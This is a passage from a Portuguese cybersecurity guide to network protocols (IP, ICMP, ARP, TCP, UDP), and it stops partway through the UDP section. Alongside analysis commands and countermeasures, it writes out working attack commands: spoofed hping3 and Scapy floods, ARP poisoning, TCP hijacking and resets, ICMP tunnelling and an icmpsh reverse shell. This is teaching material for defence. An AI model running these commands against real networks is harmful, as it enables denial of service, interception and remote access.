# Protocolos de Rede - Guia Técnico para CyberSecurity

## Índice

1. [Introdução](#introdução)
2. [Camada de Rede (Layer 3)](#camada-de-rede-layer-3)
   - [IP (Internet Protocol)](#ip-internet-protocol)
   - [ICMP (Internet Control Message Protocol)](#icmp-internet-control-message-protocol)
   - [ARP (Address Resolution Protocol)](#arp-address-resolution-protocol)
3. [Camada de Transporte (Layer 4)](#camada-de-transporte-layer-4)
   - [TCP (Transmission Control Protocol)](#tcp-transmission-control-protocol)
   - [UDP (User Datagram Protocol)](#udp-user-datagram-protocol)
4. [Camada de Aplicação (Layer 7)](#camada-de-aplicação-layer-7)
   - [HTTP/HTTPS](#httphttps)
   - [DNS (Domain Name System)](#dns-domain-name-system)
   - [SSH (Secure Shell)](#ssh-secure-shell)
   - [FTP/SFTP](#ftpsftp)
   - [SMTP/IMAP/POP3](#smtpimappop3)
   - [DHCP](#dhcp)
   - [SMB/CIFS](#smbcifs)
   - [SNMP](#snmp)
5. [Protocolos de Segurança](#protocolos-de-segurança)
   - [TLS/SSL](#tlsssl)
   - [IPSec](#ipsec)
6. [Vulnerabilidades e Ataques](#vulnerabilidades-e-ataques)
7. [Análise de Tráfego](#análise-de-tráfego)
8. [Referências e RFCs](#referências-e-rfcs)

---

## Introdução

Este documento fornece uma visão técnica detalhada dos principais protocolos de rede, com foco em aspectos de segurança, vulnerabilidades e análise forense. Cada protocolo inclui:

- **Especificação técnica** e RFCs
- **Estrutura de pacotes/frames**
- **Vulnerabilidades conhecidas**
- **Comandos de análise** (tcpdump, Wireshark, etc.)
- **Vetores de ataque** e contramedidas
- **Exemplos práticos** de análise

---

## Camada de Rede (Layer 3)

### IP (Internet Protocol)

#### Especificação Técnica

**RFC**: 
- RFC 791 (IPv4)
- RFC 2460 (IPv6)
- RFC 1918 (Private Address Space)

**Versões**:
- **IPv4**: 32 bits (4.3 bilhões de endereços)
- **IPv6**: 128 bits (340 undecilhões de endereços)

#### Estrutura do Cabeçalho IPv4

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Campos Importantes**:

| Campo | Bits | Descrição | Relevância para Segurança |
|-------|------|-----------|---------------------------|
| **Version** | 4 | Versão do IP (4 ou 6) | Ataques de downgrade |
| **IHL** | 4 | Tamanho do cabeçalho | Buffer overflow em parsing |
| **ToS/DSCP** | 8 | Tipo de serviço/prioridade | QoS bypass, exfiltração |
| **Total Length** | 16 | Tamanho total do pacote | Ataques de fragmentação |
| **Identification** | 16 | ID para fragmentação | Fingerprinting de OS |
| **Flags** | 3 | DF, MF, Reserved | Fragmentação maliciosa |
| **Fragment Offset** | 13 | Posição do fragmento | Fragroute, evasão de IDS |
| **TTL** | 8 | Time to Live | Traceroute, detecção de firewall |
| **Protocol** | 8 | Protocolo superior (6=TCP, 17=UDP, 1=ICMP) | Evasão de filtros |
| **Checksum** | 16 | Verificação de integridade | Ataques de corrupção |
| **Source IP** | 32 | IP de origem | IP Spoofing |
| **Dest IP** | 32 | IP de destino | DDoS, scanning |

#### Endereços Especiais IPv4

```bash
# Loopback
127.0.0.0/8        # localhost

# Private Networks (RFC 1918)
10.0.0.0/8         # Classe A privada
172.16.0.0/12      # Classe B privada
192.168.0.0/16     # Classe C privada

# Link-Local
169.254.0.0/16     # APIPA (Automatic Private IP Addressing)

# Multicast
224.0.0.0/4        # Multicast

# Reserved
0.0.0.0/8          # "This network"
255.255.255.255    # Broadcast limitado
```

#### Vulnerabilidades e Ataques

**1. IP Spoofing**

Falsificação do endereço IP de origem.

```bash
# Enviar pacote com IP spoofado usando hping3
sudo hping3 -a 192.168.1.50 -S -p 80 192.168.1.100
# -a: IP de origem falso
# -S: flag SYN
# -p: porta de destino

# Scapy (Python)
from scapy.all import *
packet = IP(src="192.168.1.50", dst="192.168.1.100")/ICMP()
send(packet)
```

**Contramedidas**:
- Ingress/Egress filtering (BCP 38/RFC 2827)
- RPF (Reverse Path Forwarding)
- Autenticação em camadas superiores

**2. IP Fragmentation Attacks**

Exploração do mecanismo de fragmentação para evasão de IDS/IPS.

```bash
# Fragroute - fragmentar pacotes para evasão
echo "ip_frag 24" | sudo fragroute 192.168.1.100

# Fragmentação manual com Scapy
packet = IP(dst="192.168.1.100", flags="MF")/ICMP()
send(fragment(packet, fragsize=8))

# Teardrop attack (fragmentos sobrepostos)
# Causa crash em sistemas vulneráveis
```

**Vulnerabilidades**:
- **Ping of Death**: ICMP com tamanho > 65535 bytes
- **Teardrop**: Fragmentos sobrepostos
- **Rose Attack**: Fragmentação infinita
- **Bonk/Boink**: Fragmentos duplicados

**3. TTL Manipulation**

```bash
# Detectar firewalls/proxies com TTL
# Se TTL muda, há dispositivo no caminho
ping -c 1 -t 1 target.com
traceroute -I target.com

# Evasão de traceroute
sudo hping3 --traceroute -S -p 80 target.com
```

#### Comandos de Análise

```bash
# Capturar pacotes IP
sudo tcpdump -i eth0 -n ip

# Ver cabeçalho IP completo
sudo tcpdump -i eth0 -n -v ip

# Capturar e mostrar em hexadecimal
sudo tcpdump -i eth0 -n -X ip

# Filtrar por IP de origem
sudo tcpdump -i eth0 src 192.168.1.100

# Filtrar por IP de destino
sudo tcpdump -i eth0 dst 192.168.1.100

# Ver fragmentação
sudo tcpdump -i eth0 'ip[6] & 0x20 != 0' -n

# Ver pacotes com flag DF (Don't Fragment)
sudo tcpdump -i eth0 'ip[6] & 0x40 != 0' -n

# Extrair TTL de pacotes
sudo tcpdump -i eth0 -v ip | grep ttl

# Wireshark filters
ip.addr == 192.168.1.100
ip.src == 192.168.1.100
ip.dst == 192.168.1.100
ip.ttl < 10
ip.flags.df == 1
ip.fragment
```

#### IPv6 Considerações de Segurança

```bash
# IPv6 tem cabeçalho simplificado (sem fragmentação no cabeçalho base)
# Fragmentação é feita via Extension Headers

# Capturar IPv6
sudo tcpdump -i eth0 ip6

# Ver endereços IPv6
ip -6 addr show

# ICMPv6 Neighbor Discovery Attacks
# Similar a ARP poisoning em IPv4
sudo parasite6 eth0

# IPv6 Router Advertisement Flooding
sudo fake_router6 eth0
```

**Vulnerabilidades IPv6**:
- **Extension Header Chains**: Evasão de firewalls
- **RA Flooding**: DoS via Router Advertisements
- **DAD DoS**: Duplicate Address Detection DoS
- **Tunneling Abuse**: 6to4, Teredo para exfiltração

---

### ICMP (Internet Control Message Protocol)

#### Especificação Técnica

**RFC**: RFC 792 (ICMPv4), RFC 4443 (ICMPv6)

**Função**: Mensagens de erro e diagnóstico de rede

#### Tipos de Mensagens ICMP

| Tipo | Código | Mensagem | Uso |
|------|--------|----------|-----|
| 0 | 0 | Echo Reply | Resposta ao ping |
| 3 | 0-15 | Destination Unreachable | Destino inacessível |
| 3 | 3 | Port Unreachable | Porta fechada (UDP scan) |
| 5 | 0-3 | Redirect | Redirecionamento de rota |
| 8 | 0 | Echo Request | Ping |
| 11 | 0 | Time Exceeded | TTL expirado (traceroute) |
| 13 | 0 | Timestamp Request | Sincronização de tempo |
| 30 | 0 | Traceroute | Traceroute obsoleto |

#### Estrutura do Pacote ICMP

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

#### Vulnerabilidades e Ataques

**1. ICMP Tunneling (Data Exfiltration)**

Esconder dados no campo Data do ICMP para bypass de firewalls.

```bash
# ptunnel - túnel TCP sobre ICMP
# Servidor
sudo ptunnel -x senha123

# Cliente
sudo ptunnel -p server_ip -lp 8000 -da target_ip -dp 22 -x senha123
ssh -p 8000 localhost

# icmpsh - shell reverso via ICMP
# Atacante
sudo python icmpsh_m.py 192.168.1.100 192.168.1.200

# Vítima
icmpsh.exe -t 192.168.1.100

# Detecção: pacotes ICMP com payload incomum
sudo tcpdump -i eth0 'icmp and (ip[2:2] > 100)' -X
```

**2. ICMP Redirect Attack**

Redirecionamento malicioso de tráfego.

```bash
# Enviar ICMP Redirect
sudo hping3 --icmp-redir-host 192.168.1.50 \
            -a 192.168.1.1 192.168.1.100

# Contramedida: desabilitar ICMP redirects
sudo sysctl -w net.ipv4.conf.all.accept_redirects=0
sudo sysctl -w net.ipv4.conf.all.send_redirects=0
```

**3. Smurf Attack (ICMP Amplification)**

DDoS usando ICMP broadcast.

```bash
# Atacante envia ping para broadcast com IP spoofado
sudo hping3 --icmp --flood --spoof 192.168.1.100 192.168.1.255

# Contramedida: desabilitar ICMP em broadcast
sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
```

**4. Ping of Death**

ICMP com tamanho > 65535 bytes (fragmentado).

```bash
# Moderno (não funciona em sistemas atualizados)
ping -s 65500 target.com

# Histórico: causava crash em Windows 95/NT
```

**5. ICMP Flood**

```bash
# Flood de pings
sudo hping3 --icmp --flood target.com
ping -f target.com  # requer root

# Contramedida: rate limiting
sudo iptables -A INPUT -p icmp --icmp-type echo-request \
    -m limit --limit 1/s --limit-burst 5 -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
```

#### Comandos de Análise

```bash
# Capturar ICMP
sudo tcpdump -i eth0 icmp -v

# Ver apenas Echo Request (ping)
sudo tcpdump -i eth0 'icmp[icmptype] == 8'

# Ver apenas Echo Reply
sudo tcpdump -i eth0 'icmp[icmptype] == 0'

# Ver Destination Unreachable
sudo tcpdump -i eth0 'icmp[icmptype] == 3'

# Ver Time Exceeded (traceroute)
sudo tcpdump -i eth0 'icmp[icmptype] == 11'

# Detectar ICMP tunneling (payload > 64 bytes)
sudo tcpdump -i eth0 'icmp and (ip[2:2] > 92)' -X

# Wireshark filters
icmp
icmp.type == 8
icmp.type == 0
icmp.type == 3 && icmp.code == 3  # Port Unreachable
icmp.data.len > 64  # Possível tunneling
```

#### Uso Legítimo em Segurança

```bash
# Ping sweep para discovery
nmap -sn 192.168.1.0/24

# Traceroute para mapeamento
sudo traceroute -I target.com

# MTU Path Discovery
ping -M do -s 1472 target.com  # Descobrir MTU

# Diagnóstico de conectividade
ping -c 4 8.8.8.8
```

---

### ARP (Address Resolution Protocol)

#### Especificação Técnica

**RFC**: RFC 826

**Função**: Resolução de endereço IP para MAC (Camada 3 → Camada 2)

**Características**:
- Opera apenas em rede local (não roteável)
- Stateless (sem autenticação)
- Cache temporário

#### Estrutura do Pacote ARP

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Hardware Type (1)       |       Protocol Type (0x0800)  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| HW Len (6)  | Proto Len (4) |         Operation (1 ou 2)      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                   Sender Hardware Address                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                   Sender Protocol Address                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                   Target Hardware Address                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                   Target Protocol Address                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Operation**:
- 1 = ARP Request (Who has IP X.X.X.X?)
- 2 = ARP Reply (I have IP X.X.X.X, my MAC is YY:YY:YY:YY:YY:YY)

#### Vulnerabilidades e Ataques

**1. ARP Spoofing/Poisoning**

Associar MAC do atacante a IP de outro host (Man-in-the-Middle).

```bash
# arpspoof (dsniff)
# Terminal 1: Spoofar gateway para vítima
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2: Spoofar vítima para gateway
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Terminal 3: Habilitar IP forwarding (MitM)
sudo sysctl -w net.ipv4.ip_forward=1

# Capturar tráfego
sudo tcpdump -i eth0 -w capture.pcap

# ettercap - ARP poisoning com GUI/CLI
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# bettercap - framework moderno
sudo bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on
```

**Impacto**:
- Interceptação de tráfego (credenciais, sessões)
- Modificação de dados
- DoS (descartar pacotes)

**2. ARP Flooding**

Saturar tabela ARP do switch (CAM table overflow).

```bash
# macof (dsniff)
sudo macof -i eth0

# Yersinia
sudo yersinia -I  # Interactive mode
# Selecionar ARP > Launch attack > Flooding

# Resultado: Switch entra em modo "hub", enviando tráfego para todas as portas
```

**3. Gratuitous ARP Attack**

Enviar ARP Reply não solicitado.

```bash
# arping com reply não solicitado
sudo arping -c 1 -A -I eth0 192.168.1.100

# Scapy
from scapy.all import *
arp = ARP(op=2, psrc="192.168.1.1", hwsrc="aa:bb:cc:dd:ee:ff",
          pdst="192.168.1.100", hwdst="ff:ff:ff:ff:ff:ff")
send(arp)
```

#### Contramedidas

```bash
# 1. Static ARP entries (não escalável)
sudo arp -s 192.168.1.1 00:11:22:33:44:55

# 2. Dynamic ARP Inspection (DAI) em switches gerenciáveis
# Configuração em switch Cisco:
# ip arp inspection vlan 10
# interface GigabitEthernet0/1
#   ip arp inspection trust

# 3. Detecção com arpwatch
sudo apt install arpwatch
sudo arpwatch -i eth0 -f /var/log/arpwatch.log

# 4. XArp - detecção de ARP poisoning
sudo xarp

# 5. Validação manual
watch -n 1 'arp -n'

# 6. Script de monitoramento
#!/bin/bash
GATEWAY_MAC="00:11:22:33:44:55"
GATEWAY_IP="192.168.1.1"

while true; do
    CURRENT_MAC=$(arp -n $GATEWAY_IP | awk '{print $3}' | tail -1)
    if [ "$CURRENT_MAC" != "$GATEWAY_MAC" ]; then
        echo "[ALERT] ARP poisoning detected!"
        echo "Expected: $GATEWAY_MAC, Got: $CURRENT_MAC"
        # Notificar administrador
    fi
    sleep 5
done
```

#### Comandos de Análise

```bash
# Ver cache ARP
arp -n
ip neigh show

# Limpar cache ARP
sudo ip neigh flush all

# Capturar tráfego ARP
sudo tcpdump -i eth0 arp -e -n

# Ver apenas ARP Requests
sudo tcpdump -i eth0 'arp[6:2] == 1'

# Ver apenas ARP Replies
sudo tcpdump -i eth0 'arp[6:2] == 2'

# Detectar ARP storm
sudo tcpdump -i eth0 arp -c 100 | wc -l

# Wireshark filters
arp
arp.opcode == 1  # Request
arp.opcode == 2  # Reply
arp.duplicate-address-detected
arp.src.hw_mac == aa:bb:cc:dd:ee:ff

# Análise de ARP poisoning com Wireshark
# 1. Filtrar: arp.duplicate-address-frame
# 2. Verificar: Múltiplos MACs para mesmo IP
```

#### Uso em Pentest

```bash
# Network discovery via ARP
sudo arp-scan --interface=eth0 --localnet
sudo netdiscover -i eth0 -r 192.168.1.0/24

# ARP ping
sudo arping -c 4 -I eth0 192.168.1.100

# Identificar hosts ativos (mais silencioso que ICMP)
nmap -sn -PR 192.168.1.0/24
```

---

## Camada de Transporte (Layer 4)

### TCP (Transmission Control Protocol)

#### Especificação Técnica

**RFC**: 
- RFC 793 (TCP)
- RFC 7323 (TCP Extensions)
- RFC 6298 (TCP Retransmission)
- RFC 5681 (TCP Congestion Control)

**Características**:
- **Orientado à conexão** (3-way handshake)
- **Confiável** (ACK, retransmissão)
- **Controle de fluxo** (sliding window)
- **Controle de congestionamento**
- **Ordenação** de segmentos

#### Estrutura do Cabeçalho TCP

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |       |C|E|U|A|P|R|S|F|                               |
| Offset| Rsvd  |W|C|R|C|S|S|Y|I|            Window             |
|       |       |R|E|G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Flags TCP**:

| Flag | Nome | Descrição | Uso |
|------|------|-----------|-----|
| **SYN** | Synchronize | Iniciar conexão | 3-way handshake |
| **ACK** | Acknowledgment | Confirmação | Sempre setado após SYN |
| **FIN** | Finish | Encerrar conexão | 4-way handshake de término |
| **RST** | Reset | Resetar conexão | Erro ou conexão inválida |
| **PSH** | Push | Enviar dados imediatamente | Dados urgentes |
| **URG** | Urgent | Dados urgentes | Raramente usado |
| **ECE** | ECN-Echo | Congestion notification | Controle de congestionamento |
| **CWR** | Congestion Window Reduced | Resposta ao ECE | Controle de congestionamento |

#### 3-Way Handshake

```
Cliente                                  Servidor
   |                                         |
   |--------- SYN (Seq=X) ----------------->|
   |                                         |
   |<--- SYN-ACK (Seq=Y, Ack=X+1) ----------|
   |                                         |
   |--------- ACK (Ack=Y+1) --------------->|
   |                                         |
   |<======== Conexão Estabelecida ========>|
```

#### Vulnerabilidades e Ataques

**1. SYN Flood (DoS)**

Exploração do 3-way handshake para esgotar recursos.

```bash
# hping3 - SYN flood
sudo hping3 -S -p 80 --flood --rand-source target.com
# -S: SYN flag
# --flood: enviar o mais rápido possível
# --rand-source: randomizar IP de origem

# SYN flood com Scapy
from scapy.all import *
target_ip = "192.168.1.100"
target_port = 80

for i in range(1000):
    ip = IP(src=RandIP(), dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    send(ip/tcp, verbose=0)

# Contramedida: SYN Cookies
sudo sysctl -w net.ipv4.tcp_syncookies=1

# Contramedida: Rate limiting com iptables
sudo iptables -A INPUT -p tcp --syn -m limit \
    --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
```

**2. TCP Reset Attack**

Injeção de pacote RST para derrubar conexão.

```bash
# tcpkill (dsniff) - matar conexões TCP
sudo tcpkill -i eth0 host 192.168.1.100

# hping3 - enviar RST
sudo hping3 -R -p 80 -a 192.168.1.100 192.168.1.200
# Requer conhecer Seq/Ack numbers corretos

# Detecção
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'
```

**3. TCP Session Hijacking**

Sequestro de sessão TCP ativa.

```bash
# Requisitos:
# 1. Sniffar tráfego (ARP poisoning)
# 2. Obter Seq/Ack numbers
# 3. Injetar pacotes com números corretos

# hunt - ferramenta de hijacking
sudo hunt

# Capturar Seq/Ack
sudo tcpdump -i eth0 'tcp and host 192.168.1.100' -nS

# Injetar com hping3
sudo hping3 -A -p 80 -s 54321 -M $SEQ -L $ACK \
    -d 100 -E payload.txt 192.168.1.100
```

**4. TCP Port Scanning**

```bash
# SYN Scan (stealth) - não completa handshake
sudo nmap -sS -p- 192.168.1.100

# Connect Scan (completo) - completa handshake
nmap -sT -p 1-65535 192.168.1.100

# FIN Scan - envia FIN sem conexão
sudo nmap -sF -p- 192.168.1.100

# XMAS Scan - FIN, PSH, URG
sudo nmap -sX -p- 192.168.1.100

# NULL Scan - sem flags
sudo nmap -sN -p- 192.168.1.100

# ACK Scan - detectar firewall
sudo nmap -sA -p- 192.168.1.100

# Respostas:
# Porta aberta (SYN scan): SYN-ACK
# Porta fechada: RST
# Porta filtrada: sem resposta ou ICMP unreachable
```

**5. TCP Sequence Prediction**

Prever números de sequência para hijacking.

```bash
# ISN (Initial Sequence Number) deve ser aleatório
# Sistemas antigos usavam ISN previsível

# Testar ISN randomization
sudo hping3 -S -p 80 -c 10 target.com | grep "seq="

# Contramedida: Linux usa random ISN desde kernel 2.6
```

**6. TCP Timestamp Attack**

Usar timestamps TCP para uptime reconnaissance.

```bash
# Capturar timestamps
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -v \
    | grep "TS val"

# Calcular uptime
# Timestamp incrementa a cada segundo (~100 Hz)
# Diferença entre capturas revela uptime

# Contramedida: desabilitar timestamps
sudo sysctl -w net.ipv4.tcp_timestamps=0
```

#### Estados TCP

```bash
# Ver estados de conexões TCP
ss -tan
netstat -tan

# Estados:
# LISTEN       - Aguardando conexões
# SYN_SENT     - SYN enviado, aguardando SYN-ACK
# SYN_RECEIVED - SYN-ACK enviado, aguardando ACK
# ESTABLISHED  - Conexão estabelecida
# FIN_WAIT_1   - FIN enviado
# FIN_WAIT_2   - FIN confirmado, aguardando FIN remoto
# CLOSE_WAIT   - FIN recebido, aguardando close local
# CLOSING      - Ambos enviaram FIN simultaneamente
# LAST_ACK     - Aguardando ACK final
# TIME_WAIT    - Aguardando tempo para garantir FIN recebido
# CLOSED       - Conexão fechada

# Conexões em ESTABLISHED
ss -tan state established

# Conexões em TIME_WAIT
ss -tan state time-wait

# Ajustar TIME_WAIT timeout
sudo sysctl -w net.ipv4.tcp_fin_timeout=30
```

#### Comandos de Análise

```bash
# Capturar tráfego TCP
sudo tcpdump -i eth0 tcp -n

# Ver apenas handshake (SYN, SYN-ACK, ACK)
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn'

# Ver apenas SYN
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Ver apenas RST
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'

# Ver apenas FIN
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-fin != 0'

# Ver conexões para porta específica
sudo tcpdump -i eth0 'tcp port 80'

# Ver payload TCP
sudo tcpdump -i eth0 'tcp port 80' -A

# Análise de retransmissões (possível perda de pacotes)
sudo tcpdump -i eth0 tcp -v | grep -i retransmission

# Wireshark filters
tcp
tcp.flags.syn == 1
tcp.flags.ack == 1
tcp.flags.rst == 1
tcp.flags.fin == 1
tcp.port == 80
tcp.analysis.retransmission
tcp.analysis.duplicate_ack
tcp.analysis.lost_segment
tcp.window_size_value < 1000  # Window pequeno = problema

# Análise de stream TCP no Wireshark
# Follow TCP Stream: botão direito > Follow > TCP Stream
```

#### TCP Tunning para Performance

```bash
# Buffer sizes
sudo sysctl -w net.core.rmem_max=16777216
sudo sysctl -w net.core.wmem_max=16777216
sudo sysctl -w net.ipv4.tcp_rmem="4096 87380 16777216"
sudo sysctl -w net.ipv4.tcp_wmem="4096 65536 16777216"

# Congestion control algorithm
sudo sysctl -w net.ipv4.tcp_congestion_control=bbr
# Opções: cubic (default), bbr, reno, vegas

# TCP fast open
sudo sysctl -w net.ipv4.tcp_fastopen=3

# Reuse TIME_WAIT sockets
sudo sysctl -w net.ipv4.tcp_tw_reuse=1

# SYN retries
sudo sysctl -w net.ipv4.tcp_syn_retries=3
```

---

### UDP (User Datagram Protocol)

#### Especificação Técnica

**RFC**: RFC 768

**Características**:
- **Sem conexão** (connectionless)
- **Não confiável** (sem ACK, sem retransmissão)
- **Sem controle de fluxo**
- **Sem controle de congestionamento**
- **Baixa latência** e overhead mínimo
- **Preserva limites de mensagens**

**Uso**: DNS, DHCP, SNMP, VoIP, streaming, jogos online, QUIC

#### Estrutura do Cabeçalho UDP

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            Length             |           Checksum            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          Data (payload)                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Campos**:
- **Source Port** (16 bits): Porta de origem (opcional em UDP)
- **Destination Port** (16 bits): Porta de destino
- **Length** (16 bits): Tamanho total (cabeçalho + dados), mínimo 8 bytes
- **Checksum** (16 bits): Verificação de integridade (opcional em IPv4, obrigatório em IPv6)

#### Vulnerabilidades e Ataques

**1. UDP Flood (DoS)**

Inundação de pacotes UDP para esgotar recursos.

```bash
# hping3 - UDP flood
sudo hping3 --udp -p 53 --flood --rand-source target.com

# Flood UDP com payload grande
sudo hping3 --udp -p 80 --data 1400 --flood target.com

# Scapy
from scapy.all import *
target = "192.168.1.100"
port = 53

for i in range(10000):
    ip = IP(src=RandIP(), dst=target)
    udp = UDP(sport=RandShort(), dport=port)
    payload = Raw(load="A"*1000)
    send(ip/udp/payload, verbose=0)

# Contramedida: Rate limiting
sudo iptables -A INPUT -p udp -m limit \
    --limit 10/s --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP
```

**2. UDP Amplification (DDoS)**

Exploração de serviços UDP para amplificação de tráfego.

**DNS Amplification**:

```bash
# Atacante envia query DNS pequeno com IP spoofado
# Servidor DNS responde com resposta grande para vítima

# dig com IP spoofado (requer raw sockets)
# Fator de amplificação: 28x-54x

# Exemplos de serviços vulneráveis:
# - DNS (porta 53): 28x-54x
# - NTP (porta 123): 556x
# - SNMP (porta 161): 6x
# - CharGen (porta 19): 358x
# - SSDP (porta 1900): 30x
# - Memcached (porta 11211): 10000x-51000x

# Teste de amplificação DNS (não spoofar)
dig @8.8.8.8 ANY google.com +edns=0

# Contramedidas:
# 1. BCP 38 (Ingress filtering)
# 2. Rate limiting
# 3. Response Rate Limiting (RRL) em DNS
# 4. Desabilitar recursão em DNS públicos
```

**3. UDP Port Scanning**

```bash
# UDP scan
sudo nmap -sU -p- 192.168.1.100

# Problema: UDP scan é lento
# Resposta:
# - Porta aberta: resposta do serviço ou nenhuma resposta
# - Porta fechada: ICMP Port Unreachable

# Scan rápido de portas comuns
sudo nmap -sU --top-ports 100 192.168.1.100

# Scan com detecção de versão
sudo nmap -sU -sV -p 53,161,123 192.168.1.100
```

**4. UDP Spoofing**

Falsificação de origem (mais fácil que TCP pois sem handshake).

```bash
# Enviar UDP com IP spoofado
sudo hping3 --udp -a 192.168.1.50 -p 53 \
    -d 100 -E payload.txt 192.168.1.100

# Scapy
from scapy.all import *
ip = IP(src="192.168.1.50", dst="192.168.1.100")
udp = UDP(sport=12345, dport=53)
payload = Raw(load="spoofed data")
send(ip/udp/payload)
```

#### Comandos de Análise

```bash
# Capturar tráfego UDP
sudo tcpdump -i eth0 udp -n

# Ver UDP para porta específica
sudo tcpdump -i eth0 'udp port 53'

# Ver payload UDP
sudo tcpdump -i eth0 'udp port 53' -X

# Ver tamanho de pacotes UDP (detectar amplification)
sudo tcpdump -i eth0 udp -v | grep length

# Wireshark filters
udp
udp.port == 53
udp.length > 1000  # Pacotes grandes
udp.checksum_bad   # Checksum inválido

# Ver portas UDP em listening
sudo lsof -i UDP
ss -uln

# Monitorar tráfego UDP por porta
sudo iftop -i eth0 -f "udp"
```

#### Protocolos sobre UDP

```bash
# DNS (53)
dig @8.8.8.8 google.com

# DHCP (67/68)
sudo dhclient -v eth0

# NTP (123)
